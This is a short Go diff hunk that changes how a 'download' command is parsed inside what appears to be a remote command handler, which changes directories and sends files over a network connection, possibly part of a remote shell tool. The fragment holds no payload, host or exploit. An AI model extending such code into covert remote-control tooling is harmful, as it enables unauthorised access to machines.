@@ -48,7 +48,7 @@ func main() {
 					send_msg(conn, fmt.Sprintf("Dir changed successfully to %s", cur_wd))
 				}
 			}
-		} else if cmd[0:8] == "download" { 
+		} else if strings.Split(cmd, " ")[0] == "download" { 
 			if cmd == "download" {
 				send_msg(conn, "Supply a file to download :|")
 			} else {
